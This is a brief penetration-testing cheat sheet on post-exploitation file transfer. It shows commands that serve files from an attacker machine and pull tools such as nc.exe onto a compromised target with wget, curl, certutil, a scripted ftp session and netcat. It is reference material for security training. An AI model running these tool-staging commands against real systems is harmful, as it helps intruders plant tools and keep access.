File transfers
Once we gain initial access to our target we may need to upload additional tools to help us elevate privileges or provide easier methods of accessing the machine at a later point. We might also want to download files from the target for use in our report. The following list provides a few common techniques for executing file transfers.
HTTP
On our attacking machine we have two options for serving files. The first (preferred) method is to run the SimpleHTTPServer Python module in the directory that contains the files we want to transfer.
python -m SimpleHTTPServer 80
python3 -m http.server 80
Our second option is to use our built in Apache server. To do this we need start the Apache 2 service. Once started our files will be served from var/www/html.
systemctl start Apache2 
Next, we use our target machine to request the desired filed from the server. The method varies slightly depending on the OS of the target machine.
Linux
wget http://attackerip/file
curl http://attackerip/file > file
Windows
certutil -urlcache -f http://sourceip/file.exe [c:\desired_destination\desired_]name.exe
FTP
Create an FTP server in the directory you are in, on port 21, allow anonymous access:
Python -m pyftpdlib 21
Connect with:
ftp $IPaddressofattacker
Can be made non-interactive by providing the ftp.exe with a text file containing the commands to be executed
Use the following via remote shell to download
Echo open 10.11.0.5 21 >> ftp.txt
Echo USER offsec>> ftp.txt
Echo ftp>> ftp.txt
Echo bin>> ftp.txt
Echo GET nc.exe >> ftp.txt
Echo bye >> ftp.txt
ftp -v -n -s:ftp.txt
Netcat
On receiving machine: nc -nlvp 4444 > incoming.exe
On sending machine: nc â€“ nv 10.11.23.33 4444 < file.exe
Meterpreter
Upload/download feature

